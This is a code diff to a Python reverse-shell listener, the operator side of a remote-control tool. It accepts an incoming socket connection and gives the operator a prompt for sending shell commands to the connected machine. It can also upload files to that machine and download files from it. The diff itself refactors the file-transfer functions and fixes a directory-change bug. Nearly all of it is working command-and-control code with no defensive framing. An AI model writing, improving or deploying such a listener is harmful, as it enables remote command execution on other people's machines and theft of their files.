@@ -1,10 +1,7 @@
-# server
-
 import socket
 import os
 import traceback
 import subprocess
-
 
 def start_server(host, port):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -19,63 +16,40 @@ def start_server(host, port):
 
 
 def send_file(filename, client):
-    """Send a file to the client."""
-    if not os.path.isfile(filename):
-        print(f'Error: File "{filename}" not found!')
-        client.send(b'FILE_NOT_FOUND')
-        return
-
-    client.send(b'FILE_OK')  # Notify client that file exists
-    file_size = os.path.getsize(filename)
-    client.send(str(file_size).encode())  # Send file size
-
-    with open(filename, "rb") as f:
-        while chunk := f.read(4096):  # Send in chunks
+    with open(filename, 'rb') as f:
+        chunk = f.read(1024)
+        while chunk:
             client.send(chunk)
-
-    print(f'File "{filename}" sent successfully!')
+            chunk = f.read(1024)
+        f.close()
+    client.close()
 
 
 def recv_file(filename, client):
-    """Receive a file from the client."""
-    status = client.recv(10).decode()  # Check if the file exists
-    if status == 'FILE_NOT_FOUND':
-        print(f'Error: Remote file "{filename}" not found!')
-        return
-
-    file_size = int(client.recv(20).decode())  # Get file size
-    received = 0
-
-    with open(filename, "wb") as f:
-        while received < file_size:
-            chunk = client.recv(4096)
-            if not chunk:
+    with open(filename, 'wb') as f:
+        while True:
+            data = client.recv(4096)
+            if not data:
                 break
-            f.write(chunk)
-            received += len(chunk)
+            f.write(data)
+        f.close()
 
 
 def shell_session(client, addr, server):
-
     exit_list = ['exit', 'break', 'close', 'bye', 'quit']
 
     try:
         while True:
-            # command input
             command = input(f'{addr[0]}\033[1m*\033[32m>_\033[m: ').strip()
             if command.lower() in exit_list:
                 client.send(command.lower().encode())
                 break
             elif not command:
                 pass
-
-            # use "!" for local commands
             elif command.startswith('!'):
                 local_command = command[1:].strip()
-
-                # handles "cd" separately
                 if local_command.startswith('cd'):
-                    path = local_command[:3].strip()
+                    path = local_command[3:].strip()
                     try:
                         os.chdir(path)
                         print(f'Changed local directory to: {os.getcwd()}')
@@ -88,19 +62,17 @@ def shell_session(client, addr, server):
                 else:
                     subprocess.run(local_command, shell=True)
             elif command.startswith('upload'):
-                filename = command[7:]
+                filename = command[7:].strip()
                 send_file(filename, client)
             elif command.startswith('download'):
-                filename = command[9:]
+                filename = command[9:].strip()
                 recv_file(filename, client)
             else:
-               client.send(command.encode())
-               output = client.recv(1024).decode()
-               if output == 'no output!' or output == 'chdir':
-                   pass
-               else:
+                client.send(command.encode())
+                output = client.recv(1024).decode()
+                if output not in ['no output!', 'chdir']:
                     print(output)
-    except Exception as e :
+    except Exception as e:
         print(f'Error: {e}')
         print(traceback.format_exc())
     finally:
@@ -116,4 +88,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
